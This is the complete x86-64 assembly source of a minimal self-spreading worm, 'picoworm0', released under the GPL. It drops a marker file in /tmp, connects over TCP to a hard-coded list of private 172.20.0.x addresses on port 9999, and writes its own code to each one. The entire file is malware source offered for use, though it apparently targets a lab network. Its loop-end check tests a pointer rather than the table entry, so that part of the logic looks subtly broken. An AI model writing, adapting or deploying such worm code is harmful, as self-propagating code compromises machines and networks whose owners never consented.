;;; 
;;;  *  picoworm0. Basic Worm without vulnerable service scaning
;;;  *  Copyright (c) 2023 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.


BITS 64
section .text
global _start
_start:
	lea  	rdi, [rel mark]
	mov  	rsi, 100o | 200o; O_CREAT | O_EXCL
	mov  	rdx, 700o	; S_IRWXU
	call 	_open
	test 	rax,rax
	jl   	pw_done		; On error (file already exists finish)
	mov  	rdi, rax		
	call 	_close	        ; Done with payload

	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Do the scan
	;; 	call scan
	
	xor 	r9, r9		    ; IP Table counter
	lea 	r10, [rel ip_table] ; Pointer to IP Table
scan:	
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov 	rdi, 2		; PF_INET 2
	mov	rsi, 1		; SOCK_STREAM
	mov 	rdx, 6              ; IPPROTO_TCP
	call 	_socket

 	mov 	rdi, rax           	; Just use the new created socket
	lea 	rsi, [r10 + r9*8]
	mov 	rdx, 16
	call 	_connect

	test 	eax, eax
	jl 	error
	;;  Otherwise move the code
	;;  RDI still contains the socket
	mov 	rsi, _start
	mov 	rdx, code_size
	call 	_write
	
error:
	call 	_close
	inc 	r9
	lea 	rax, [r10 + r9*8]
	test 	eax, eax
	je 	pw_done
	;; When we get here RDI contains the socket FD
	jmp 	scan

pw_done:	
	call 	_exit
	;; End of program
	
_write:
	xor 	eax,eax
	inc 	eax
	jmp 	_do_syscall
_open:
	mov 	eax, 02
	jmp 	_do_syscall
	
_socket:
	;; mov rax, 41
	xor 	eax,eax
	add 	al, 41
	jmp 	_do_syscall
	
_connect:
	;; 	mov rax, 42
	xor 	eax,eax
	add 	al, 42
	jmp 	_do_syscall
	
_close:
	;; mov rax, 3
	xor 	eax,eax
	add 	al, 3
	jmp 	_do_syscall

_exit:
	xor 	eax,eax
	add 	al, 60

_do_syscall:
	syscall
	ret

worm_data:	
	mark    db "/tmp/pw",0
ip_table:
	dq 0x050014ac0f270002
	dq 0x590014ac0f270002
	dq 0x740014ac0f270002
	dq 0x680014ac0f270002
	dq 0x5e0014ac0f270002		
	dq 0x0			; End of table
code_size equ $ - $$
